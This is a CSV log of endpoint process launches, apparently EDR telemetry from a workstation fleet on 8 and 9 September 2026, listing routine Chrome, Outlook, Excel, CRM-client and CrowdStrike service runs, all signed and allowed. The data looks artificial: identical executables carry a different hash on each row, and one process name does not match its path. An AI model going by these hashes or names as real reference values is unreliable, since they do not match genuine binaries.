event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00105,2026-09-08 09:40:35,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",545095e6014b033a4e5440797b8b9eda28e71ab57f652ccd763e231e4e7c6462,signed,ALLOWED,Low
P00106,2026-09-08 09:43:23,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",8a5e3a6c239ec56b63144ea9aee12236a9883a68950502638e82e2e7cdc56db9,signed,ALLOWED,Low
P00107,2026-09-08 09:51:26,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",17ff8898319c4718a617ce058323793981776393830c464cfb82a95df433d12b,signed,ALLOWED,Low
P00108,2026-09-08 10:20:22,WKST-CS-006,nnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d1586696d71d3bcbdd4087f072c322a85e4926021c951dfc1f39add3dfc21a15,signed,ALLOWED,Low
P00109,2026-09-08 10:25:12,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",42d40d4f79de7bb1e4ebb17176a62b5bd60b7a67e508ecd0c0312063a8e999cb,signed,ALLOWED,Low
P00110,2026-09-08 10:42:56,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,13295eb7d824ad4bedb31d89fad9340e19a6d5305b2988f68509937a7f3f6104,signed,ALLOWED,Low
P00111,2026-09-08 10:56:23,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fec923a113f68eaa06d662970542a0f70a2aedbd33ba511e4e7a4d177705fd2f,signed,ALLOWED,Low
P00112,2026-09-08 11:10:46,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,ca399ddf6545d4e5f1c0fd55de636b01a73ebf73f642e1a2dd76aca804485598,signed,ALLOWED,Low
P00113,2026-09-08 11:27:37,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1f97651c9408d0af072d0122cef210d7ea92ef92bf9f6d33934b38c475648bb5,signed,ALLOWED,Low
P00114,2026-09-08 11:52:33,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",cce167eb1ca5a24bc18d1b124de50d36c3fe941dd827b3738f6315586047837d,signed,ALLOWED,Low
P00115,2026-09-08 11:52:52,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2919a2444d58438bbdc7a57934760e11b5db09225ffa98456bc69484e9d3c2e7,signed,ALLOWED,Low
P00116,2026-09-08 12:15:18,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",12b1edc71ba50036e4d6953a96e00ae5357363daaeb8dbbcecfe9431c28b7f44,signed,ALLOWED,Low
P00117,2026-09-08 12:27:09,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",9e05561099c27668e009dfaf3f3e67fc553664f86d4ecda27ee5b241a7921c78,signed,ALLOWED,Low
P00118,2026-09-08 12:27:45,WKST-FIN-004,tshivute,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",02648593b6ba25646a65cb57dd1748f66bbce8200982c0ff7128ef095cf06d00,signed,ALLOWED,Low
P00119,2026-09-08 12:35:20,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",a134b97e21757ef1f644df16900c0aa0355605ea530f47acf478ffe0e50bc41a,signed,ALLOWED,Low
P00120,2026-09-08 12:36:52,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f28965726387962d627b5c708a90abfd53c63044ab374befc1e992ca31342232,signed,ALLOWED,Low
P00121,2026-09-08 12:43:31,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",aa2f8ce299b9baa56d80a93d87f73b10292e574d051f0269ebf971aefcb11c42,signed,ALLOWED,Low
P00122,2026-09-08 12:46:16,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,ae973bbea28616abd3abb9a78de692e9a78ed02ba92968a3edb80054fc8f762c,signed,ALLOWED,Low
P00123,2026-09-08 12:47:52,WKST-LOAN-018,shilongo,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a6cc9b88754b565090191e0a56745610e4309e3c5f8ca427c1875a2e43287340,signed,ALLOWED,Low
P00124,2026-09-08 12:50:50,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,ee27a1fddd12541e4496f2f9e9ba7596e2be96ccf00eb91eac11ff77277784ae,signed,ALLOWED,Low
P00125,2026-09-08 12:56:27,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",28bae08f6196778948561de11e688d387f24789ae41b20fdc72d79adeec1052d,signed,ALLOWED,Low
P00126,2026-09-08 13:15:06,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8d990bffe86e333c3e7668483d7dd9bf2f19ec0865e92ddc2e3db110ab8ad0cb,signed,ALLOWED,Low
P00127,2026-09-08 13:18:16,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9aa5bf79027c09c3babc8d4c0b58366ed1bd4a6776480a8e8859d012727b8fe3,signed,ALLOWED,Low
P00128,2026-09-08 13:38:36,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",505cc28811154f5adcd05f14d670d59f876851a0256be63cd9933a07199c48d3,signed,ALLOWED,Low
P00129,2026-09-08 13:39:14,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,33b549cd353128d4e1a11841d40402297ac4a07bd8ecbc4480272e00f882ce8b,signed,ALLOWED,Low
P00130,2026-09-08 13:48:27,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ebd81bca223c4b0e32dcd79df7f26c871ccc2a0eca888ac896ff9f7a4cd5b3d3,signed,ALLOWED,Low
P00131,2026-09-08 13:49:39,WKST-FIN-021,jkavari,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",ceae098cfb0ee4e3701bc29ca39d661b785cd782908009abcc36f0ff69b764d9,signed,ALLOWED,Low
P00132,2026-09-08 14:04:27,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c9a860cf745430a62edddeb90fe9a71f65766c06082bc197cedd2f37736f9ca9,signed,ALLOWED,Low
P00133,2026-09-08 14:08:54,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4a2acd965922bb1a5b1745ad75ed4fe793b23157e3f562aa00d468a41625ac33,signed,ALLOWED,Low
P00134,2026-09-08 14:20:31,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",3784be862a8a7705de8d436d1ab4a55d993c23b558a42040e4d015fa8ad06b9f,signed,ALLOWED,Low
P00135,2026-09-08 14:31:17,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",735c0cf4c0f0e48cd295a969497bb8c3628edd1211661ccce56ef2dc5712fa46,signed,ALLOWED,Low
P00136,2026-09-08 14:43:29,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d104ba491ed8567c3dee44c5351741ef894da484446246699c766cb2812c784c,signed,ALLOWED,Low
P00137,2026-09-08 14:44:45,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",30b6401b845957bdbd9fb2051247bdfb7f9e0e4e028a55e1142cd2e6469694d2,signed,ALLOWED,Low
P00138,2026-09-08 14:48:06,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b4fcfea0085c7d17eac0488d7ae63e87f3b59aaca4914ab43cd7d4cef5848102,signed,ALLOWED,Low
P00139,2026-09-08 16:01:13,WKST-MKT-010,ntinda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8962d925376181c2b03c2e51a0cce6876d9be8941021d867017457491264ba2d,signed,ALLOWED,Low
P00140,2026-09-08 16:19:23,WKST-RSK-006,murorua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,459d989300d427946bbc3cc8a10e7e8dc3dcb5c9da216629f1ab1b70dba197f1,signed,ALLOWED,Low
P00141,2026-09-08 16:37:27,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f4814059d2243f3bed1696c873c6a139d9c91ba2063e074222eb44b9b6ba5695,signed,ALLOWED,Low
P00142,2026-09-08 16:59:17,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,9c4d1dcca281dfa5002d773da1c16345d1369d8ff8be2cfc29b62aab02e2439a,signed,ALLOWED,Low
P00143,2026-09-08 17:00:52,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",365788da3dd3a9d666a0f337cd449598bf191f227615ce72e0e1eed88975d7ef,signed,ALLOWED,Low
P00144,2026-09-08 17:06:15,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",135ed7f8158d1b45016dbcd18c9f1fdc339517e4fd1ebb2de0317916d4d1c40f,signed,ALLOWED,Low
P00145,2026-09-08 17:31:09,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",71d3ee9a48d0fe74477991f57ed9fb551b6daa0a66de48276eadf5e303b0e6a6,signed,ALLOWED,Low
P00146,2026-09-08 17:32:36,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8aefdf0d822c6a78a7b3cc29083d5c735f921e357d04780cc17bcdc5b0df94f1,signed,ALLOWED,Low
P00147,2026-09-08 17:46:07,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0ea57af8845b5660ab20af48db38dc1729aa9e43b0c4898ddfb51c52962e7748,signed,ALLOWED,Low
P00148,2026-09-08 17:51:24,WKST-CS-006,nnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",cf567c912623dbe7be70fe28cbe9833654a11f701657b8d4dd6c3680050487bb,signed,ALLOWED,Low
P00149,2026-09-08 18:23:24,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",896dcb517f58313fd157f3bdec0c86a911c683ebc0202fe1f3f3d15d0af9a849,signed,ALLOWED,Low
P00150,2026-09-08 18:23:31,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",1143e92d8b8ef2979ed709cfbb255a0b88bc056f008e881c38e0af89665a7166,signed,ALLOWED,Low
P00151,2026-09-08 18:30:25,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a4871865ed680269033bf00a52e8d091b4f874ff49433886023df4cfdf68f882,signed,ALLOWED,Low
P00152,2026-09-08 18:47:37,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c347fe04c5a5ff45b77e9fec3aa26a354629f228d31fd689f28bc6c1edfb9ecf,signed,ALLOWED,Low
P00153,2026-09-08 19:09:55,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,dd99d712dac25b3c8956ddf1231e0f60a6381b99daf6f3c659693ec2d4903469,signed,ALLOWED,Low
P00154,2026-09-08 19:21:36,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b7987edace9d9a08310140fd6abf17528015aca66048f64aa97cf4b4dd25b3e6,signed,ALLOWED,Low
P00155,2026-09-08 19:30:25,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",54a9b48acacfa07940dc7a3b99b00a45ce84f67408b0fadfe8765888d7c1189f,signed,ALLOWED,Low
P00156,2026-09-08 19:36:33,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",dbdfb40c5524cca2f431152cecb54d8bc01a477e612c55a4a63f6ad344c0b184,signed,ALLOWED,Low
P00157,2026-09-08 19:37:04,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8319005b633f3c379870342674f5c72c2e71070e8877a05b0ee666d782978398,signed,ALLOWED,Low
P00158,2026-09-08 19:39:57,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",e36982cb4b184dfa4ea9da378018d7b06d28cd58819f197047a383cf7230c66a,signed,ALLOWED,Low
P00159,2026-09-08 19:48:55,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8748af74d96b098ad42c8a05e01267de805b2b72c495b96ab6ec4163180d1a32,signed,ALLOWED,Low
P00160,2026-09-09 06:03:14,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6288bc6a8f7d6a7433fd37d44665585127a7173978d9733a208723d9621cf72a,signed,ALLOWED,Low
P00161,2026-09-09 06:21:44,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",695210356c463854d2b3cf3f2e441f62579fd07fa351e231773877d26682d6f8,signed,ALLOWED,Low
P00162,2026-09-09 06:25:33,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4844bd14f9ad8c8d2440525ba09c859ef7329b3e2c0d36efcb4b0248e6e38926,signed,ALLOWED,Low
P00163,2026-09-09 06:38:50,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7ee6e4d1f10dc82b8013a625d4a809a52b33cd160416cd5aaeb43f3e62e3d86e,signed,ALLOWED,Low
P00164,2026-09-09 06:42:12,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",673d8f82f85694d12e85bd00599f193dc0ca545d937b7b60e4447da66ce13381,signed,ALLOWED,Low
P00165,2026-09-09 06:44:58,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a0d4dbcf683e710e37898f61038f12632aca141a8aee8c1de0b27e977cd69a9b,signed,ALLOWED,Low
P00166,2026-09-09 06:54:23,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",63ea247e87cefb02c3f797dfd4d4ba8e50d4ecbd686df9fe0f68774f55fc5d45,signed,ALLOWED,Low
P00167,2026-09-09 06:54:35,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e587030416b88ae4c34c50c0bd4b1ba93b3814054d410f24b8a844c1cdf34355,signed,ALLOWED,Low
P00168,2026-09-09 07:06:22,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3bc9fbb9244e7c55795d15b96bd258344b0483361b6525b8780b28ac4a9d8f9d,signed,ALLOWED,Low
P00169,2026-09-09 07:15:01,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",8dcb3da37ab26fc95db5f28ff04f0aa8a48b8bc14070df24324fcd96c0c53d2b,signed,ALLOWED,Low
P00170,2026-09-09 07:30:43,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",359de023c7f3b68c3ff6479888d8ebc3a3a4b04db49102b9d0a0c6a66a2d372f,signed,ALLOWED,Low
P00171,2026-09-09 07:41:29,WKST-AUD-004,tjirera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0f0a513c2a7c3ba5d5f3e1463996de2c0fbe407f30ec1e691fd756f3f23bcbb0,signed,ALLOWED,Low
P00172,2026-09-09 07:59:29,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d496a2091765d7e2dd3576c01b76556a08cb1cc2cb8277c8d3fe6a357c8d76d8,signed,ALLOWED,Low
P00173,2026-09-09 07:59:34,WKST-CS-011,tkamati,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",21c5a2c7b682141ecd75d114b778351e51624da29d6484b25375b47914152b7e,signed,ALLOWED,Low
P00174,2026-09-09 08:20:40,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",198d823638469970dddba088764a27d3bcd018210efd629e0afbfb32e22f4def,signed,ALLOWED,Low
P00175,2026-09-09 08:20:56,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",99e583ee82323ff1aaa7481c706c6c3fc15b0f91740d740857f726068e00d85a,signed,ALLOWED,Low
P00176,2026-09-09 09:03:12,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",5a396098d931fe17449b11b9d66032a078dc35b2419d1c67587625be592e7092,signed,ALLOWED,Low
P00177,2026-09-09 09:13:17,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",911065754f960e2a0958d047aaa50484dead66d97d42f23e995a87bbad187b28,signed,ALLOWED,Low
P00178,2026-09-09 09:20:18,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,72e29c6ce7752a1dcb081cc65c247d51c724b7d021a8b3bedfe44e8e9a2c4cf6,signed,ALLOWED,Low
P00179,2026-09-09 09:21:19,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",71c8ea691d14aa88f720d7a964939a16f0e5a218e6a858eb52e912b4321ae1e2,signed,ALLOWED,Low
P00180,2026-09-09 09:21:54,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3717473ade151f8c8a046ed53964cda4b11264992209d7dbc539e2e197c9d26e,signed,ALLOWED,Low
P00181,2026-09-09 09:39:15,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ccaa74fe065b67544a5936cd44a506aeff11aa4d0d6c9d0574440e5ee85dc085,signed,ALLOWED,Low
P00182,2026-09-09 09:39:58,WKST-RSK-006,murorua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",65245b29d61ce39e55160fccd921e0bc09aa18a0577f1989e916cd17fed2b81f,signed,ALLOWED,Low
P00183,2026-09-09 09:41:03,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,57cd0f003b0deb84e50f68634e07f9bc8e424ae1c205dff31a98fea324989318,signed,ALLOWED,Low
P00184,2026-09-09 09:46:47,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3f6d4ceb2af4623cf6d9f176e77c12d9a5827ec1503a730d55c8d7f120125b95,signed,ALLOWED,Low
P00185,2026-09-09 09:54:36,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ced955887931cc43cdb3efcd1ff21c4403c5627697717b14f5e8c3be81470d51,signed,ALLOWED,Low
P00186,2026-09-09 09:59:30,WKST-CMP-009,kndjavera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",4311abd51ddc1655ab675ef6c0083ce971b154cee09bf4fe0ae0f934ee620822,signed,ALLOWED,Low
P00187,2026-09-09 09:59:47,WKST-MKT-010,ntinda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f839dc5f6260fb2aa2905fabaa64d3a3ad2bd5821afce15507336a9037c7b02b,signed,ALLOWED,Low
P00188,2026-09-09 10:18:13,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,99107829bc05563069f17f632331aa16f0e1a03e531e2291dbf78cd348dab2fa,signed,ALLOWED,Low
P00189,2026-09-09 10:28:39,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",17652f9d4d9ef52b3a91abee8ce7206ea5ec22d55cdf929b21cc2a97a7637693,signed,ALLOWED,Low
P00190,2026-09-09 10:31:55,WKST-HR-002,pnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",09e67a4782cea3cacc9ab9fa6426cb9cf429582645d9a0618eb00d55c383757c,signed,ALLOWED,Low
P00191,2026-09-09 10:46:20,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e8bc6d07a835d93e6f6ec72780fe5c9fdd7b18fa0fc2b555c89284a92bdf1c22,signed,ALLOWED,Low
P00192,2026-09-09 11:02:42,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",add44c483e968d87e3dfa1c4626a0081faa7df5abc680968ee640c9bd9c59e0c,signed,ALLOWED,Low
P00193,2026-09-09 11:20:38,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8b894431697410b035511463ad986262f09442299897079159b021360de1da1c,signed,ALLOWED,Low
P00194,2026-09-09 11:25:20,WKST-FIN-004,tshivute,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2748fe77b4d9577790b287f9d63e03551ef9c3c6528c9ed6413917c980d6d592,signed,ALLOWED,Low
P00195,2026-09-09 11:29:35,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ee142bb7297a1f22308af80cfc764e422056ff2a7a2254859c63c58a61102655,signed,ALLOWED,Low
P00196,2026-09-09 11:42:54,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",f63a12a670b46fced66ef6c02a26176ef32c42927f2b7ac0bee5c770681d25c7,signed,ALLOWED,Low
P00197,2026-09-09 12:21:56,WKST-HR-002,pnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",c813682082a1da6d6adeb6e838672d62ea1c61b2c0f985cdc34eb21510f7e4c8,signed,ALLOWED,Low
P00198,2026-09-09 12:21:57,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5cea5e20bc390a90663f5d54feecd2ff0b238fdbfc4d86c37b6646be507b0995,signed,ALLOWED,Low
P00199,2026-09-09 12:45:05,WKST-RSK-006,murorua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e44746646727c966a78ed45cdae00230928bc4b85c605a19586ee709b04ca417,signed,ALLOWED,Low
P00200,2026-09-09 13:18:35,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",913d15055eddf0fa96dcb7820dd2affb51bba143d6fa71da4da1e7c9678716bc,signed,ALLOWED,Low
P00201,2026-09-09 13:21:25,WKST-FIN-021,jkavari,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",46b3d55a8649af37adc1a07f46ebfa5e600b78ac39b63e74079d7aa8aa3b7c6d,signed,ALLOWED,Low
P00202,2026-09-09 13:42:57,WKST-FIN-004,tshivute,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ebf8ddcd7cbc456e881f2280a03ecb3e6978c5d7f864e7fa245f29f5a0dc9328,signed,ALLOWED,Low
P00203,2026-09-09 13:48:40,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",39a352b2513b79da5439543247d3875024816c7065d3ca7be7dbf2a202ce65f8,signed,ALLOWED,Low
P00204,2026-09-09 13:49:31,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",115974e313e3bbc7e32bcc33abaac10232cc0fd6d7f24aa433ef0abe6ea71613,signed,ALLOWED,Low
P00205,2026-09-09 14:05:51,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",14b8fef3c11ffdac8d2987e45ebf160f6f58e3ffad6c3db396327136979682fb,signed,ALLOWED,Low
P00206,2026-09-09 14:06:53,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8848491256affb82980974c124df00364a6e06c975ffdfe16779647639cd9d64,signed,ALLOWED,Low
P00207,2026-09-09 14:09:11,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5d11a3b2a0140d7a0691eac83e2e13e0475e06e912a6071c475cb11ddf3cc391,signed,ALLOWED,Low
P00208,2026-09-09 14:13:53,WKST-IT-012,katjiuongua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",5d2b7fe885b7319853c3045a743af9c80da425736c4eb7e261a5fc87e3a5d66c,signed,ALLOWED,Low
P00209,2026-09-09 14:22:55,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2f77637f4bc3f9a3dc72d224e39a8fa4b60a41a71d43849f12337854db2f8119,signed,ALLOWED,Low
